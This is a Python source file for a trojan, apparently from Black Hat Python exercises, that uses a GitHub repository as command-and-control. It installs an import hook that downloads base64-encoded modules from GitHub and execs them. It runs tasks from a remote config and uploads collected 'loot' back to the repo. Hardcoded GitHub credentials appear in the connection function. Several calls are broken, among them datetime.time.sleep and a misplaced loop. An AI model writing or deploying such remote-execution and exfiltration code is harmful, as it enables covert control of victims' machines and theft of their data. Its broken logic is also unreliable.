#!/usr/bin/python3
import sys, os
import datetime, random, imp
import threading, queue
import base64

from simplejson import loads
from github3 import login

ID="test"
CONFIG_DIR="config/%s.json" % ID
LOOT_DIR="loot/%s/" % ID
LOOT_NUM = 1

TROJAN_MODULES=[]
CONFIGURED=False
TASK_QUEUE=queue.Queue()

class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None):
        if CONFIGURED:
            new_module = GetFile(path + "/" + name)
            if new_module is not None:
                self.current_module_code = base64.b64decode(new_module)
                return self
        else:
            return None

    def load_module(self, name):
        module = imp.new_module(name)
        exec(self.current_module_code) in module.__dict__

def RunModule(module):
    TASK_QUEUE.put(1)
    result = sys.modules[module].run()
    TASK_QUEUE.get()

    StoreLoot(result)
    return
        
def ConnectToGithub():
    gh = login(username="iwakura1ain", password="912ehd406gh")
    repo = gh.repository("iwakura1ain", "BlackHatPython-Examples")
    branch = repo.branch("main")

    return gh,repo,branch

def GetFile(dir):
    gh, repo, branch = ConnectToGithub()
    file_tree = branch.commit.commit.tree.recurse()

    for file in file_tree:
        if dir in file.path:
            blob = repo.blob(file._json_data['sha'])

            return blob.content

def GetConfig():
    global CONFIGURED

    if not CONFIGURED:
        config = loads(base64.b64decode(GetFile(CONFIG_DIR))) #simplejson, base64 used
        CONFIGURED = True

    while True:
        task = TASK_QUEUE.get(block=True)
        if task["module"] not in sys.modules:
            exec("import %s" % task["module"])

    return config

def StoreLoot(loot):
    global LOOT_NUM
    
    gh, repo, branch = ConnectToGithub()
    remote_path = "%s/%d-%s.txt" % (LOOT_DIR, LOOT_NUM, datetime.time.strftime("%H%M"))
    repo.create_file(remote_path, datetime.date.strftime("%Y-%m-%d"), base64.b64encode(loot))
    LOOT_NUM += 1

    return

def main():
    sys.meta_path = [GitImporter()]

    while True:
        if TASK_QUEUE.empty():
            config = GetConfig()
            for task in config:
                t = threading.Thread(target=RunModule, args=(task["module"],))
                t.start()
                datetime.time.sleep(random.randint(1,10))

    datetime.time.sleep(random.randint(1,10))

    
if __name__=="__main__":
    main()
    
                
        

    
